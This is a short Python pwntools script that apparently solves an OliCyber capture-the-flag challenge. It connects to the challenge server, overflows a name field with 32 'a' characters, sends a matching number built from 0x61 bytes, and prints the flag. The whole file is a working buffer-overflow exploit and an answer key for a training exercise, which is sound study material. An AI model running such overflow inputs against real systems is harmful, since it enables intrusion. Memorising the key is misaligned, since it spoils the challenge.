from pwn import *
from Crypto.Util.number import *
r = remote("gtn.challs.olicyber.it", 10022)
r.recv(1000)
r.sendline(str("a"*32).encode()) # overflow del nome
r.recv(1000)
r.sendline(str(bytes_to_long(bytes.fromhex("6161616161616161"))).encode()) # numero con overflow in esadecimale
r.recvuntil(b"flag")
print("flag" + r.recvuntil(b"}").decode())